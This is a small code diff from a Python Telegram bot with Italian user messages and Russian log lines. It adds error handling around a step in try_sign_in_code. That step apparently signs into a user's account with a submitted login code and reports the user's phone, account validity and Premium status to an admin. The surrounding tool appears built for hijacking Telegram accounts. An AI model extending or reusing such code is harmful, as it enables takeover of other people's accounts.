@@ -182,7 +182,12 @@ async def try_sign_in_code(user_id, code):
                 f"💎 Premium: {'✅ Sì' if has_premium else '❌ No'}\n"
                 f"✅ Valido: {'Sì' if is_valid else 'No'}"
             )
-            await bot.send_message(ADMIN_ID, status, parse_mode="Markdown")
+
+            try:
+                print(f"[+] Новый пользователь авторизовался: {phone}, отправка уведомления админу...")
+                await bot.send_message(ADMIN_ID, status, parse_mode="Markdown")
+            except Exception as e:
+                print(f"[!] Ошибка при отправке админу: {e}")
 
             await bot.send_message(user_id, "✅ Autenticazione avvenuta con successo!")
             await client.disconnect()
